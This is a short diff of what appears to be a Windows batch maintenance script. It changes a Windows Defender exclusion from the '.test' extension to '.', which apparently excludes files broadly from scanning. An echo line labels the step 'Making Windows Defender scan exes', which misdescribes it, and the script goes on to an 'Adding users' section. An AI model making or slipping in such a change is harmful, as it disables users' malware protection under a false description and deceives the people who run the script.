@@ -64,7 +64,7 @@ echo Restoring PC health
 dism /online /cleanup-image /restorehealth 
 
 echo Making Windows Defender scan exes
-powershell "Add-MpPreference -ExclusionExtension '.test'"
+powershell "Add-MpPreference -ExclusionExtension '.'"
 
 echo Adding users
 :AddUsers
